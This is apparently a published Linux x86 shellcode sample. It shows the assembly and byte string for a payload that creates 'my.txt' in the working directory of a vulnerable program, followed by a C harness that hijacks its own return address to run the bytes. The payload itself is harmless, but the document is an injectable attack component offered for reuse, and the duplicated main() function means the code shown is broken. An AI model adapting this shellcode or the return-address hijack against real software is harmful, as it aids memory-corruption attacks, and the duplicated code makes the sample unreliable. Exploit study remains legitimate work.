/*
#Title: Create 'my.txt' in present working directory of vulnerable software
#Length: 37 bytes
#Date: 3 April 2015
#Author: Mohammad Reza  Ramezani (mr.ramezani.edu [at] gmail com - g+)
#Tested On: kali-linux-1.0.6-i386




Section   .text
global _start

_start:
push byte 8
pop eax
jmp short GoToCall
shellcode:
pop ebx
xor edx, edx
mov [ebx + 6], dl
push word 0544o
pop ecx
int 0x80

push byte 1
pop eax
xor ebx, ebx
int 0x80


GoToCall:
call shellcode
db 'my.txtX'


This shellcode can generalized by using of absolute path instead of 'my.txt'
*/

char shellcode[] = "\x6a\x08\x58\xeb\x14\x5b\x31\xd2"
"\x88\x53\x06\x66\x68\x64\x01\x59\xcd\x80\x6a\x01\x58"
"\x31\xdb\xcd\x80\xe8\xe7\xff\xff\xff\x6d\x79\x2e\x74"
"\x78\x74\x58";

int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}


int main()
{
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}